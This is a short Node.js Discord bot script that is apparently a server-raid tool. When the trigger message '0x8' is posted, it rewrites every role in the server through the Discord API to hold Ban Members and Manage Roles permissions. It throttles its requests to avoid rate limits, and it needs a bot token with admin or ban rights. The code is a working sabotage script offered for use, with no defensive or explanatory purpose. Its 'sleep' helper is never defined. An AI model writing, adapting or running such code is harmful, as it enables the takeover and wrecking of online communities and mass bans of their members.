const Discord = require("discord.js")
const client = new Discord.Client()
const rq = require("request")

client.on("ready", () => {
  console.log(client.user.tag, "est prêt \n cmd > 0x8")
}).on("message", (message) => {
let count = 0;
  if(message.content != "0x8") return;
  message.guild.roles.forEach(async(r) => {
  if(count === 12) await sleep(250) 
 if(count === 12) count = 0;
  rq(`https://discord.com/api/v9/guilds/${message.guild.id}/roles/${r.id}`, {
  "headers": {
    "accept": "*/*",
    "authorization": client.token,
    "content-type": "application/json"
  },
  "body": `{\"name\":\"${r.name}\",\"permissions\":\"268435460\",\"color\":0,\"hoist\":false,\"mentionable\":false}`,
  "method": "PATCH"
}, (err, response, body) => {
    console.log(body)
});
 count++;
    
    
    
    
  })
}).login("token perm admin or perm ban+ role")
